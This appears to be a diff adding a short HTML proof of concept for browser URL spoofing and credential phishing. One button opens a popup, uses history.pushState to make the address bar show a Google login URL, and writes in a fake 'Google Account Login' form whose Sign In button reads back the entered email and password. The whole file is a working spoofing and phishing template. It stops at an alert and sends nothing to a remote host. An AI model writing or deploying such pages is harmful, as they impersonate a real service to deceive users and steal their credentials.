@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <button onclick="spoof()">Click to spoof</button>
+
+    <script>
+      function spoof() {
+        let win = window.open("", "_blank", "width=600,height=400");
+
+        // Spoof the URL visually only
+        win.history.pushState({}, "", "https://www.google.com/login");
+
+        // Write custom content
+        win.document.write(`
+          <h1 style="font-family:Arial;">Google Account Login</h1>
+          <input id="user" placeholder="Email" style="margin:5px;width:250px"><br>
+          <input id="pass" type="password" placeholder="Password" style="margin:5px;width:250px"><br>
+          <button onclick="
+            alert('Captured:\\nEmail: ' +
+              document.getElementById('user').value +
+              '\\nPassword: ' + document.getElementById('pass').value);
+          ">Sign In</button>
+        `);
+
+        win.document.close();
+      }
+    </script>
+  </body>
+</html>
